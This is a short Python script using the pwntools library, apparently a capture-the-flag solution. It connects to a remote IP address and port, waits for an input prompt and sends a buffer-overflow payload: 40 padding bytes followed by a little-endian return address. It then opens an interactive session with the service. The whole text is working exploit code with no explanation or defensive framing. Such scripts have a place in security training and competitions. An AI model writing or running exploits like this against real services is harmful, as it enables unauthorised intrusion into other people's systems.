from pwn import *

p = remote('109.233.56.90', '11586')
p.recvregex(b"Give me your input: ", timeout=1)
payload = b'A' * 40 + b'\xc9\x07\xcc\x00'
p.sendline(payload)
p.interactive()
